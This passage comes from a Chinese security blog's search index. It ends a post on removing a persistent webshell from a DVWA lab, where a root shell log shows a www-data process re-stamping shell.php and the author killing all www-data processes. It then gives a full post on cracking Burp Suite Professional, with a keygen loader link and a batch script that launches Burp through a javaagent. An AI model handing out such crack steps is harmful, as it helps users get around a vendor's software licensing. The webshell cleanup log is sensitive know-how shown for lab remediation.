class="line"> root@59870bd856a8:/var/www/html/hackable/uploads# ls -l</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 root     root     667 Jun  5  2018 dvwa_email.png</span><br><span class="line">-rw-r--r-- 1 www-data www-data  86 Dec  1  2018 shell.php</span><br><span class="line"></span><br><span class="line">root@59870bd856a8:/var/www/html/hackable/uploads# ps aux |grep www-data</span><br><span class="line">www-data   632  0.0  0.4 350960 15776 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data   633  0.0  0.4 350796 16692 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data   635  0.0  0.3 350936 15228 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data   638  0.0  0.4 350952 15576 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data   639  0.0  0.4 350944 15704 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data   819  8.1  0.3 350440 15224 ?        S    Jun28 134:34 apache2 -D FOREGROUND</span><br><span class="line">www-data   821  0.0  0.4 350796 16688 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line">root      6018  0.0  0.0   8868   944 pts/0    S+   03:51   0:00 grep --color=auto www-data</span><br><span class="line">www-data  6019  0.0  0.0   4448   680 ?        S    03:51   0:00 sh -c touch -m -d &quot;2018-12-01 09:10:12&quot; shell.php</span><br><span class="line">www-data 25716  0.0  0.4 350940 16364 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data 29851  0.0  0.3 350928 15156 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data 30136  0.0  0.3 350852 15156 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data 30137  0.0  0.3 350852 15420 ?        S    Jun28   0:00 apache2 -D FOREGROUND</span><br><span class="line"></span><br><span class="line">root@59870bd856a8:/var/www/html/hackable/uploads# ps aux |grep www-data |awk &#x27;&#123;print $2&#125;&#x27;</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">635</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">819</span><br><span class="line">821</span><br><span class="line">18850</span><br><span class="line">25716</span><br><span class="line">29851</span><br><span class="line">30136</span><br><span class="line">30137</span><br><span class="line">root@59870bd856a8:/var/www/html/hackable/uploads# ps aux |grep www-data |awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9 </span><br><span class="line"></span><br><span class="line">root@59870bd856a8:/var/www/html/hackable/uploads# ls</span><br><span class="line">dvwa_email.png  shell.php</span><br><span class="line">root@59870bd856a8:/var/www/html/hackable/uploads# rm shell.php</span><br><span class="line">root@59870bd856a8:/var/www/html/hackable/uploads# ls</span><br><span class="line">dvwa_email.png</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> php </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite在windows的安装及一键化启动</title>
      <link href="/2021/05/04/Burpsuite%E5%9C%A8windows%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%B8%80%E9%94%AE%E5%8C%96%E5%90%AF%E5%8A%A8/"/>
      <url>/2021/05/04/Burpsuite%E5%9C%A8windows%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%B8%80%E9%94%AE%E5%8C%96%E5%90%AF%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<ul><li><h4 id="今天Menge发现，自己装的burp的新版爆破模块少了点东西，线程好像没有了，于是打算重新装一个burp2020-11-3版本的，就出这一篇小白教程，教小白在windows下如何一键化去启动burp，任何版本都一样。"><a href="#今天Menge发现，自己装的burp的新版爆破模块少了点东西，线程好像没有了，于是打算重新装一个burp2020-11-3版本的，就出这一篇小白教程，教小白在windows下如何一键化去启动burp，任何版本都一样。" class="headerlink" title="今天Menge发现，自己装的burp的新版爆破模块少了点东西，线程好像没有了，于是打算重新装一个burp2020.11.3版本的，就出这一篇小白教程，教小白在windows下如何一键化去启动burp，任何版本都一样。"></a>今天Menge发现，自己装的burp的新版爆破模块少了点东西，线程好像没有了，于是打算重新装一个burp2020.11.3版本的，就出这一篇小白教程，教小白在windows下如何一键化去启动burp，任何版本都一样。</h4></li></ul><h2 id="下载和安装环境"><a href="#下载和安装环境" class="headerlink" title="下载和安装环境"></a>下载和安装环境</h2><h4 id="下载burpsuite的jar："><a href="#下载burpsuite的jar：" class="headerlink" title="下载burpsuite的jar："></a>下载burpsuite的jar：</h4><p><a href="https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=Jar">https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=Jar</a></p><p>java环境可以自己去安装一下,网上文章很多，就不赘述了。Menge用的是jdk11版本。</p><h4 id="下载BurploaderKeygen"><a href="#下载BurploaderKeygen" class="headerlink" title="下载BurploaderKeygen:"></a>下载BurploaderKeygen:</h4><p>BurploaderKeygen很多大佬都有做，Menge使用的是这个。</p><p><a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">https://github.com/h3110w0r1d-y/BurpLoaderKeygen</a></p><h4 id="打包，改名"><a href="#打包，改名" class="headerlink" title="打包，改名"></a>打包，改名</h4><p>将其文件都打包到一个文件夹内，将官网下载的 burpsuite_pro_v2020.11.3.jar 重命名为BurpSuite_Professional.jar，如图所示：</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625540524545-a063e44a-4862-474a-8842-74df411f7fe1.png" alt="image.png"></p><h2 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h2><p>打开BurploaderKeygen.jar</p><p>开始破解，其步骤就不赘述了，常规操作，网上很多。</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625540803685-838f98e5-78ad-4a37-82ad-b1c1ae5095e7.png" alt="image.png"></p><h2 id="一键化脚本启动"><a href="#一键化脚本启动" class="headerlink" title="一键化脚本启动"></a>一键化脚本启动</h2><p>在当前目录下新建一个txt.内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">START javaw -javaagent:BurpLoaderKeygen.jar -noverify -jar BurpSuite_Professional.jar</span><br></pre></td></tr></table></figure><p>写完改后缀为.bat</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625540579143-3de6c3a2-8f71-4d9e-9d01-1daafd97cd11.png" alt="image.png"></p><p>可以点击看看能不能一键启动。应该是没什么问题的如果你的文件名是对的话。</p><h2 id="创建快捷方式和美化"><a href="#创建快捷方式和美化" class="headerlink" title="创建快捷方式和美化"></a>创建快捷方式和美化</h2><p>将刚刚的bat发送到桌面快捷方式，右键属性，可以看到更改图标</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625542048171-cc3dbd30-042f-4d9e-af8a-e566a0956f3c.png" alt="image.png"></p><p>可以再网上去找一下icon，个人喜欢蓝色的那个。</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625540969905-e50055ae-7ffb-4208-9c62-705348dbe1d3.png" alt="image.png"></p><p>换好图标后重命名一下。最后效果如图：</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625541914500-f13d08be-fadc-4beb-b029-d87eb7865fcd.png" alt="image.png"></p><p>打开一键化启动，完美！这样就大功告成了。</p><h2 id="支持一下"><a href="#支持一下" class="headerlink" title="支持一下"></a>支持一下</h2><p>喜欢本文章的话，觉得本文章对你有所帮助的话，可以去<a href="https://mengn1e.github.io/reward/">https://mengn1e.github.io/reward/</a>  打赏一下孩子~</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 美化 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
